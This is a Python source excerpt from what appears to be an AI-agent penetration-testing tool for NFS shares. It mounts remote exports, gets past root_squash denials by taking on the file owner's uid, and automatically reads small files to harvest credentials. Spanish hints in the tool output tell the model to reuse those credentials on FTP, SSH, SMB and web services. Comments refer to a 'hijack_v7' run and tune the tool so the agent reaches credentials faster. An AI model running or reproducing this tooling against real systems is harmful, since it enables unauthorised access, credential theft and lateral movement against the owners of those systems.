                image_env="NEXUS_NFS_IMAGE", default_image="python:3.12-alpine",
            )
            effective = elevate
            if (
                not result.timed_out
                and result.exit_code != 0
                and _permission_denied(result.stderr, result.stdout)
            ):
                # ``root_squash``: root maps to ``nobody`` and the entries belong
                # to a numeric uid. Find it, then list as that uid.
                uid = await _discover_export_uid(sandbox, programs, elevate, mountpoint)
                if uid:
                    effective = [
                        *elevate, programs["setpriv"], f"--reuid={uid}",
                        f"--regid={uid}", "--clear-groups",
                    ]
                    retry = await run_in_sandbox(
                        sandbox,
                        [*effective, programs["find"], mountpoint,
                         "-maxdepth", str(NFS_MOUNT_FIND_MAXDEPTH),
                         "-printf", "%y %10s %p\\n"],
                        timeout_seconds=min(int(timeout_seconds), 120),
                        image_env="NEXUS_NFS_IMAGE",
                        default_image="python:3.12-alpine",
                    )
                    if not retry.timed_out and str(retry.stdout or "").strip():
                        result = retry
                        evidence["listed_as_uid"] = uid
            if result.timed_out:
                return None, "find timed out over the mounted export"
            lines: list[str] = []
            for raw in str(result.stdout or "").splitlines():
                line = raw.rstrip()
                if not line.strip():
                    continue
                # ``find -printf`` prints the export root too; the model asked
                # for it, so it is not an entry of the listing.
                if line.split(maxsplit=2)[-1] == mountpoint:
                    continue
                lines.append(line.replace(mountpoint + "/", "").strip())
            if not lines and result.exit_code != 0:
                # Never report a failed ``find`` as an empty export: that is what
                # told hijack_v7 there was nothing in the share.
                return None, (
                    (result.stderr or result.stdout or "").strip()[:2_000]
                    or f"find exited with {result.exit_code}"
                )
            evidence["entries_total"] = len(lines)
            entries = lines[:NFS_MAX_LISTING_LINES]
            # Auto-loot: the first bytes of the small files, in the same answer.
            # Without it the model guesses names (Hijack: ``README.txt``) and
            # burns turns on 404-style failures instead of reading the file that
            # holds the credential.
            loot = await _mount_loot(
                sandbox, programs, mountpoint, lines, effective
            )
            evidence["files_read"] = int(loot.get("files_total") or 0)
            evidence["credentials_found"] = len(loot.get("credentials") or [])
            listing = ToolResult(
                output={
                    "target": target,
                    "action": action,
                    "path": path,
                    "via": "kernel_mount",
                    "entries": entries,
                    "count": len(entries),
                    "truncated": len(lines) > NFS_MAX_LISTING_LINES,
                    **loot,
                    "hint": (
                        "Listado leído desde un montaje real del export, con el "
                        "contenido de los ficheros de texto pequeños incluido. Si "
                        "un fichero no aparece en `files`, léelo con "
                        'nexus.recon.nfs(action="read", path=..., file="<ruta>").'
                    ),
                },
                verified=True,
                verification_method="nfs_listing_via_kernel_mount",
                evidence=evidence,
                exit_code=result.exit_code,
                stdout=result.stdout,
                stderr=result.stderr,
            )
            return listing, ""

        child = _safe_child(mountpoint, file)
        if child is None:
            return None, f"file escapes the export: {file}"
        result = await run_in_sandbox(
            sandbox, [*elevate, programs["cat"], child],
            timeout_seconds=min(int(timeout_seconds), 120),
            image_env="NEXUS_NFS_IMAGE", default_image="python:3.12-alpine",
        )
        if (
            not result.timed_out
            and result.exit_code != 0
            and _permission_denied(result.stderr, result.stdout)
        ):
            # ``root_squash``: the file belongs to another uid and root reads it
            # as ``nobody``. Drop to the numeric owner for this one command.
            as_owner = await _uid_prefix(sandbox, programs, elevate, child)
            if as_owner != elevate:
                evidence["read_as_owner"] = True
                result = await run_in_sandbox(
                    sandbox, [*as_owner, programs["cat"], child],
                    timeout_seconds=min(int(timeout_seconds), 120),
                    image_env="NEXUS_NFS_IMAGE", default_image="python:3.12-alpine",
                )
        if result.timed_out:
            return None, "cat timed out over the mounted export"
        if result.exit_code != 0:
            return None, (result.stderr or "").strip()[:2_000] or "cat failed"
        content = str(result.stdout or "")
        truncated = len(content.encode("utf-8", "replace")) > NFS_MAX_READ_BYTES
        evidence["file"] = file
        evidence["bytes_total"] = len(content.encode("utf-8", "replace"))
        read = ToolResult(
            output={
                "target": target,
                "action": action,
                "path": path,
                "file": file,
                "via": "kernel_mount",
                "preview": content[:NFS_MAX_READ_BYTES],
                "truncated": truncated,
            },
            verified=bool(content),
            outcome="" if content else "negative",
            verification_method="nfs_file_read_via_kernel_mount",
            evidence=evidence,
            exit_code=result.exit_code,
            stdout=content[:NFS_MAX_READ_BYTES],
            stderr=result.stderr,
        )
        return read, ""
    finally:
        if mounted_here:
            try:
                await run_in_sandbox(
                    sandbox,
                    [programs["sudo"], "-n", programs["umount"], mountpoint],
                    timeout_seconds=30,
                    image_env="NEXUS_NFS_IMAGE",
                    default_image="python:3.12-alpine",
                )
            except (FileNotFoundError, PermissionError, OSError):
                evidence["umount"] = "failed"


async def _list_every_export(
    target: str,
    timeout_seconds: int,
    context: RunContext,
    arguments: dict[str, Any],
) -> ToolResult:
    """``action=list`` with no path: the whole export surface in one answer.

    Measured in hijack_v7 (2026-10-30, iterations 24-47): the model ran
    ``showmount``, got the table, and then asked for ``/mnt/share`` -a path it
    invented- until the branch closed. The export was ``/`` and the file it
    needed was two directories below it. Listing every export removes the guess,
    and each listing already brings the small text files with it.
    """
    workspace_root = os.getenv("NEXUS_WORKSPACE_ROOT", os.getcwd())
    sandbox, programs = _sandbox(workspace_root)
    evidence: dict[str, Any] = {
        "action": "list",
        "target": target,
        "noise_level": "low",
        "all_exports": True,
    }
    result, exports = await _exports(
        sandbox, target, timeout_seconds, program=programs["showmount"]
    )
    if result is None:
        return ToolResult(
            output={
                "error": "showmount is not available in the sandbox",
                "target": target,
                "guidance": NFS_INSTALL_GUIDANCE["showmount"],
            },
            verified=False,
            outcome="unavailable",
            verification_method="nfs_showmount_unavailable",
            evidence=evidence,
        )
    if result.exit_code != 0 and not exports:
        # rpcbind/mountd refused or the host ignores the RPC call: that is the
        # same answer ``action=exports`` gives, with the same install/pivot hint.
        return _exports_result(result, exports, evidence, target=target)
    if not exports:
        return ToolResult(
            output={
                "target": target,
                "action": "list",
                "exports": [],
                "count": 0,
                "message": (
                    "El host responde a rpcbind pero no exporta ninguna ruta: no "
                    "hay nada que listar por NFS. Pivota a otro servicio."
                ),
            },
            verified=True,
            outcome="negative",
            verification_method="nfs_no_exports",
            evidence=evidence,
        )
    per_export_timeout = max(10, min(int(timeout_seconds), 45))
    listed: list[dict[str, Any]] = []
    files: list[dict[str, Any]] = []
    credentials: list[dict[str, str]] = []
    for entry in exports[:5]:
        child_arguments = {
            "target": target,
            "action": "list",
            "path": entry["path"],
            "timeout_seconds": per_export_timeout,
        }
        child = await nfs_handler(child_arguments, context)
        output = child.output if isinstance(child.output, dict) else {}
        listed.append(
            {
                "path": entry["path"],
                "verified": child.verified,
                "outcome": child.outcome or "",
                "output": output,
            }
        )
        for item in output.get("files") or []:
            if isinstance(item, dict) and item not in files:
                files.append(item)
        for handle in output.get("credentials") or []:
            if isinstance(handle, dict) and handle not in credentials:
                credentials.append(handle)
    verified = any(item["verified"] for item in listed)
    outcomes = {str(item["outcome"]) for item in listed}
    evidence["exports_total"] = len(exports)
    evidence["exports_listed"] = len(listed)
    evidence["files_read"] = len(files)
    evidence["credentials_found"] = len(credentials)
    summary: dict[str, Any] = {
        "target": target,
        "action": "list",
        "all_exports": True,
        "exports": listed,
        "count": len(listed),
        "files": files,
        "files_total": len(files),
        "credentials": credentials,
    }
    if credentials:
        summary["next_steps"] = [
            "Credenciales encontradas en los exports: úsalas en el servicio que "
            "corresponda (FTP, SSH, SMB, web) con la tool de ese servicio "
            "(nexus.recon.ftp acepta username/password).",
        ]
    return ToolResult(
        output=summary,
        verified=verified,
        outcome="" if verified else ("partial" if "partial" in outcomes else "negative"),
        verification_method="nfs_all_exports_listed",
        evidence=evidence,
    )


__all__ = [
    "NFS_ACTIONS",
    "NFS_ALLOWED_PROGRAMS",
    "NFS_INSTALL_GUIDANCE",
    "NFS_MOUNT_ENV",
    "NFS_MOUNT_FAILED_HINT",
    "NFS_MOUNT_GUIDANCE",
    "NFS_MOUNT_OPTIONS",
    "existing_mountpoint",
    "nfs_definition",
    "nfs_handler",
    "nfs_mount_allowed",
    "parse_exports",
    "resolve_program",
]
